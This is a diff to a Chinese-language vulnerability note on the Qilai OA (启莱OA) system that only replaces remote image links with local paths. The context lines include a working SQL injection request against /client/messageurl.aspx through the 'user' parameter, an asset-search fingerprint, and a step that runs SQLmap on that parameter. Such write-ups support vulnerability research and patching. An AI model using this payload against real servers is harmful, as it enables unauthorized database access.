@@ -20,7 +20,7 @@ app="启莱OA"
 
 登录页面如下
 
-![qilai-2-1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/qilai-2-1.png)
+![qilai-2-1](./images/qilai-2-1.png)
 
 存在SQL注入的文件为 messageurl.aspx
 
@@ -28,8 +28,8 @@ app="启莱OA"
 http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1
 ```
 
-![qilai-2-2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/qilai-2-2.png)
+![qilai-2-2](./images/qilai-2-2.png)
 
 使用SQLmap对参数 user 进行注入
 
-![qilai-2-3](https://typora-1308934770.cos.ap-beijing.myqcloud.com/qilai-2-3.png)
+![qilai-2-3](./images/qilai-2-3.png)
